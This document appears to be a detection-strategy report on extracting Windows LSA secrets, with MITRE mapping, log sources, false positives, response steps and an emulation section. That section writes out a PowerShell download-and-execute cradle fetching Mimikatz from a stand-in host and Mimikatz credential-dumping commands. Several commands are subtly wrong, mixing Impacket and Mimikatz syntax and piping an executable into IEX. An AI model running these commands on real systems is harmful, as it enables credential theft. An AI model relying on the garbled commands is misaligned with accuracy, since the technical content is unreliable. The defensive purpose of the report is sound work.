# Alerting & Detection Strategy Report

## Goal

The goal of this detection technique is to identify and detect adversarial attempts to extract sensitive credentials stored in the Local Security Authority (LSA) Secrets on Windows systems. This encompasses detecting techniques used to bypass security measures by adversaries aiming to access LSA secrets, which can lead to further exploitation or lateral movement within a network.

## Categorization

- **MITRE ATT&CK Mapping:** T1003.004 - LSA Secrets
- **Tactic / Kill Chain Phases:** Credential Access
- **Platforms:** Windows

[MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1003/004)

## Strategy Abstract

The detection strategy focuses on monitoring system and application logs, PowerShell execution history, and process activity to identify patterns indicative of LSA secrets extraction. Key data sources include:

- **Windows Event Logs:** Specifically, Security logs for suspicious activities like unauthorized access or changes.
- **Sysmon Logs:** For detecting processes that interact with the LSASS.exe (Local Security Authority Subsystem Service) process.
- **PowerShell Script Execution:** To monitor and identify scripts commonly used in dumping LSA secrets.

Patterns analyzed include:
- Unusual command-line arguments related to security utilities like `lsadump`, `secretsdump.py`, or PowerShell commands targeting LSASS memory.
- Unexpected access attempts by non-administrative accounts.
- Network traffic patterns indicating the use of external tools for credential exfiltration.

## Technical Context

Adversaries often employ various techniques to dump LSA secrets, such as leveraging Mimikatz or creating custom scripts. These methods typically involve:

1. **Process Injection:** Using PowerShell or other utilities like `psexec` to inject code into LSASS.exe.
2. **Direct Memory Access:** Executing tools that read the memory space of LSASS directly.

Common commands used in these attacks include:
- `Invoke-Mimikatz -DumpCreds`
- `secretsdump.py lsadump::sam`

Adversary emulation scenarios may involve running these commands under controlled conditions to understand their signatures and impact on system logs.

## Blind Spots and Assumptions

- **Blind Spots:**
  - Detection might miss obfuscated or heavily modified scripts.
  - Encrypted network communications could evade detection of exfiltration attempts.

- **Assumptions:**
  - The strategy assumes that logging configurations are comprehensive and capture all relevant activities.
  - It is assumed that the system has adequate monitoring for PowerShell execution and process interactions.

## False Positives

Potential benign activities that might trigger false alerts include:
- Legitimate use of security tools like Mimikatz for authorized penetration testing or internal audits.
- System administrators performing maintenance tasks involving credential management or backups.
- Misconfigured scripts or applications unintentionally accessing LSASS memory.

## Priority

**Severity: High**

Justification: 
Access to LSA secrets can provide adversaries with a wide range of credentials, including domain admin passwords. This capability significantly increases the risk of further exploitation and lateral movement within an enterprise network.

## Validation (Adversary Emulation)

### Step-by-Step Instructions:

1. **Environment Setup:**
   - Use a controlled Windows test environment.
   - Ensure Sysmon is installed to monitor process creation, command-line arguments, and network connections.

2. **Dumping LSA Secrets:**

   - Download Mimikatz using PowerShell:
     ```powershell
     IEX (New-Object Net.WebClient).DownloadString('https://example.com/mimikatz.exe')
     ```
   
   - Execute the following to dump credentials:
     ```shell
     mimikatz # privilege::debug sekurlsa::logonpasswords
     ```

3. **Dump Kerberos Tickets:**

   - Use `dumper.ps1` script for extracting tickets from LSASS memory:
     ```powershell
     .\dumper.ps1 lsadump::ekeys
     ```

4. **Monitor and Analyze:**
   - Review Sysmon logs for suspicious activities.
   - Check PowerShell execution history for relevant command patterns.

## Response

When the alert fires, analysts should:

- Immediately isolate the affected system from the network to prevent further data exfiltration.
- Conduct a thorough investigation to determine the scope of the breach and potential lateral movement.
- Review all recent administrative actions and logs for signs of unauthorized access or privilege escalation.
- Notify relevant stakeholders and consider engaging incident response teams if necessary.

## Additional Resources

For further context and understanding, refer to:

- **PowerShell Download and Execution Cradles:** Techniques involving PowerShell scripts used in attacks.
- **PowerShell Web Download Pattern:** Identifying web-based downloads executed via PowerShell.
- **Usage Of Web Request Commands And Cmdlets:** Common commands that indicate external data interactions.
- **Use Short Name Path in Command Line:** A tactic to evade detection by using short paths.
- **Psexec Execution:** Monitoring for unauthorized remote execution tools.
- **Potential Execution of Sysinternals Tools:** Understanding how legitimate tools can be misused.

This structured approach ensures a comprehensive understanding and effective monitoring against LSA secrets extraction attempts.